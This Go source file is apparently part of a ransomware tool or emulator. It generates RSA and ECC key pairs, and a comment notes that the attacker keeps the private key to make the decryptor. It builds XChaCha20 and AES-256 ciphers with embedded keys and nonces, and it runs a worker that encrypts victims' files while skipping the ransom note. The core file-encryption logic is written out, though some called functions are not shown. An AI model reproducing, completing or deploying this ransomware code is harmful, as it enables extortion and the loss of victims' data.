package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/elliptic"
	r "crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"github.com/Anonghost720/ecc"
	"golang.org/x/crypto/chacha20"
	"hash"
	"io"
	"os"
	"path/filepath"
	"sync"
)

func getPublicRSAKeyFromFile(file string) (*rsa.PublicKey, error) {
	pubKeyData, err := os.ReadFile(file)
	if err != nil {
		return nil, fmt.Errorf("Failed to read public key file: %v", err)
	}
	// Decode the PEM data
	block, _ := pem.Decode(pubKeyData)
	if block == nil || block.Type != "RSA PUBLIC KEY" {
		return nil, fmt.Errorf("Failed to decode PEM block containing public key")
	}

	// Parse the public key
	pub, err := x509.ParsePKCS1PublicKey(block.Bytes)
	if err != nil {
		return nil, fmt.Errorf("Failed to parse public key: %v", err)
	}
	return pub, nil
}

func getPrivateRSAKeyFromFile(file string) (*rsa.PrivateKey, error) {
	keyData, err := os.ReadFile(file)
	if err != nil {
		return nil, fmt.Errorf("Failed to read private key file: %v", err)
	}
	// Decode the PEM data
	block, _ := pem.Decode(keyData)
	if block == nil || block.Type != "RSA PRIVATE KEY" {
		return nil, fmt.Errorf("Failed to decode PEM block containing private key")
	}
	// Parse the public key
	pri, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		return nil, fmt.Errorf("Failed to parse private key: %v", err)
	}
	return pri, nil
}

func getPublicECCKeyFromFile(file string) (*ecc.Public, error) {
	keyData, err := os.ReadFile(file)
	if err != nil {
		return nil, fmt.Errorf("Failed to read public ECC key file: %v", err)
	}
	publicKey, err := ecc.ParsePublicKey(elliptic.P521(), keyData)
	if err != nil {
		return nil, err
	}
	return publicKey, nil
}

func getPrivateECCKeyFromFile(file string) (*ecc.Private, error) {
	keyData, err := os.ReadFile(file)
	if err != nil {
		return nil, fmt.Errorf("Failed to read private ECC key file: %v", err)
	}
	pks := ecc.Private{
		D: nil,
		Public: &ecc.Public{
			Curve: elliptic.P521(),
			X:     nil,
			Y:     nil,
		},
	}
	err = json.Unmarshal(keyData, &pks)
	if err != nil {
		return nil, err
	}
	return &pks, nil
}

func generateRSA() (string, string) {

	filename := "rsa_key"
	bitSize := 4096

	rsakey, err := rsa.GenerateKey(r.Reader, bitSize)
	if err != nil {
		panic(err)
	}
	pub := rsakey.Public()

	// Encode private key to PKCS#1 ASN.1 PEM.
	keyPEM := pem.EncodeToMemory(
		&pem.Block{
			Type:  "RSA PRIVATE KEY",
			Bytes: x509.MarshalPKCS1PrivateKey(rsakey),
		},
	)

	// Encode public key to PKCS#1 ASN.1 PEM.
	pubPEM := pem.EncodeToMemory(
		&pem.Block{
			Type:  "RSA PUBLIC KEY",
			Bytes: x509.MarshalPKCS1PublicKey(pub.(*rsa.PublicKey)),
		},
	)

	// Typically, this is the key attacker would retain control of to generate decryptor
	if err := os.WriteFile(filename+".rsa", keyPEM, 0700); err != nil {
		panic(err)
	}

	if err := os.WriteFile(filename+".rsa.pub", pubPEM, 0755); err != nil {
		panic(err)
	}
	return filename + ".rsa.pub", filename + ".rsa"
}

func generateECC() (string, string, error) {
	// Using https://github.com/Anonghost720/ecc/blob/master/LICENSE as a helper function implementing ECIES
	filename := "ecc_key"
	privateKeyStruct, err := ecc.GenerateKey(elliptic.P521())
	if err != nil {
		return "", "", err
	}
	/*	privateInt, err := privateKeyStruct.D.MarshalText()
		if err != nil {
			return "", "", err
		}*/

	/*	msg := []byte("TESTINGTESTING")
		c, err := k1.Public.Encrypt(msg)
		if err != nil {
			log.Fatalln(err)
		}
		m, err := k1.Decrypt(c, k1.Public.Curve)
		if err != nil {
			log.Fatalln(err)
		}*/

	f, err := os.Create(filename + ".ecc")
	if err != nil {
		return "", "", err
	}
	defer f.Close()
	jsonData, err := json.Marshal(privateKeyStruct)
	if err != nil {
		return "", "", err
	}
	f.Write(jsonData)

	if err = os.WriteFile(filename+".ecc.pub", privateKeyStruct.Public.Bytes(), 0755); err != nil {
		return "", "", err
	}
	return filename + ".ecc.pub", filename + ".ecc", nil
}

func generateKeys() (AsymKeyHandler, error) {
	var err error
	asymKeys := AsymKeyHandler{
		RSAPublicKey:      nil,
		RSAPublicKeyFile:  "",
		RSAPrivateKeyFile: "",
		ECCPrivateKeyFile: "",
		ECCPublicKeyFile:  "",
		RSAPrivateKey:     nil,
		ECCPublicKey:      nil,
		ECCPrivateKey:     nil,
		System:            "",
	}
	// TODO error handling
	asymKeys.RSAPublicKeyFile, asymKeys.RSAPrivateKeyFile = generateRSA()
	/*	asymKeys.RSAPublicKey, err = getPublicRSAKeyFromFile(publicRSAKeyFile)
		if err != nil {
			return asymKeys, err
		}
		asymKeys.RSAPrivateKey, err = getPrivateRSAKeyFromFile(privateRSAKeyFile)
		if err != nil {
			return asymKeys, err
		}*/
	asymKeys.ECCPublicKeyFile, asymKeys.ECCPrivateKeyFile, err = generateECC()
	if err != nil {
		return asymKeys, err
	}
	/*	asymKeys.ECCPublicKey, err = getPublicECCKeyFromFile(publicECCKeyFile)
		if err != nil {
			return asymKeys, err
		}
		asymKeys.ECCPrivateKey, err = getPrivateECCKeyFromFile(privateECCKeyFile)
		if err != nil {
			return asymKeys, err
		}*/
	/*	msg := []byte("TESTINGTESTING")
		c, err := asymKeys.ECCPublicKey.Encrypt(msg)
		if err != nil {
			log.Fatalln(err)
		}
		m, err := asymKeys.ECCPrivateKey.Decrypt(c, asymKeys.ECCPublicKey.Curve)
		if err != nil {
			log.Fatalln(err)
		}
		fmt.Println(m)
		fmt.Println(string(m))*/

	return asymKeys, nil

}

func encryptionWorker(c chan File, ewg *sync.WaitGroup, noteName string, method string, cipher string, extension string, asymKeys AsymKeyHandler, decrypt bool, group RansomActor) {
	// Receives files to encrypt
	defer ewg.Done()
	for {
		file, ok := <-c
		if !ok {
			break
		} else {
			if filepath.Base(file.Path) == noteName {
				continue
			}
			if decrypt {
				if cipher == "xchacha20" {
					decryptFileXChaCha20(file, cipher, privateKey, group)
				} else if cipher == "aes256" {
					decryptFileAES256(file, privateKey, group)
				}
			} else {
				if cipher == "xchacha20" {
					encryptFileXChaCha20(file, method, extension, publicKey)
				} else if cipher == "aes256" {
					encryptFileAES256(file, method, extension, publicKey)
				}
			}
		}
	}
}

func getXChaCha20Cipher(sym_key []byte, nonce []byte) (*chacha20.Cipher, []byte) {
	if sym_key == nil {
		sym_key = make([]byte, 32)
		if _, err := io.ReadFull(r.Reader, sym_key); err != nil {
			panic(err)
		}
	}
	if nonce == nil {
		// 192-bit nonce (24 bytes) for XChaCha20
		nonce = make([]byte, 24)
		if _, err := io.ReadFull(r.Reader, nonce); err != nil {
			panic(err)
		}
	}
	c, err := chacha20.NewUnauthenticatedCipher(sym_key, nonce)
	if err != nil {
		panic(err)
	}
	emeddedData := make([]byte, 0)
	emeddedData = append(emeddedData, sym_key...)
	emeddedData = append(emeddedData, nonce...)
	return c, emeddedData
}

func getAES256Cipher(sym_key []byte, nonce []byte) (cipher.Stream, []byte) {

	if sym_key == nil {
		sym_key = make([]byte, 32)
		if _, err := io.ReadFull(r.Reader, sym_key); err != nil {
			panic(err)
		}
	}
	if nonce == nil {
		nonce = make([]byte, 16)
		if _, err := io.ReadFull(r.Reader, nonce); err != nil {
			panic(err)
		}
	}

	block, err := aes.NewCipher(sym_key)
	if err != nil {
		panic(err.Error())
	}
	aesCTR := cipher.NewCTR(block, nonce)
	emeddedData := make([]byte, 0)
	emeddedData = append(emeddedData, sym_key...)
	emeddedData = append(emeddedData, nonce...)
	return aesCTR, emeddedData
}

// RSA Encryption/Decryption
// https://stackoverflow.com/questions/62348923/rs256-message-too-long-for-rsa-public-key-size-error-signing-jwt?answertab=votes#tab-top
func EncryptOAEP(hash hash.Hash, random io.Reader, public *rsa.PublicKey, msg []byte, label []byte) ([]byte, error) {
	msgLen := len(msg)
	step := public.Size() - 2*hash.Size() - 2
	var encryptedBytes []byte

	for start := 0; start < msgLen; start += step {
		finish := start + step
		if finish > msgLen {
			finish = msgLen
		}

		encryptedBlockBytes, err := rsa.EncryptOAEP(hash, random, public, msg[start:finish], label)
		if err != nil {
			return nil, err
		}

		encryptedBytes = append(encryptedBytes, encryptedBlockBytes...)
	}

	return encryptedBytes, nil
}

// https://stackoverflow.com/questions/62348923/rs256-message-too-long-for-rsa-public-key-size-error-signing-jwt?answertab=votes#tab-top
func DecryptOAEP(hash hash.Hash, random io.Reader, private *rsa.PrivateKey, msg []byte, label []byte) ([]byte, error) {
	msgLen := len(msg)
	step := private.PublicKey.Size()
	var decryptedBytes []byte

	for start := 0; start < msgLen; start += step {
		finish := start + step
		if finish > msgLen {
			finish = msgLen
		}

		decryptedBlockBytes, err := rsa.DecryptOAEP(hash, random, private, msg[start:finish], label)
		if err != nil {
			return nil, err
		}

		decryptedBytes = append(decryptedBytes, decryptedBlockBytes...)
	}

	return decryptedBytes, nil
}
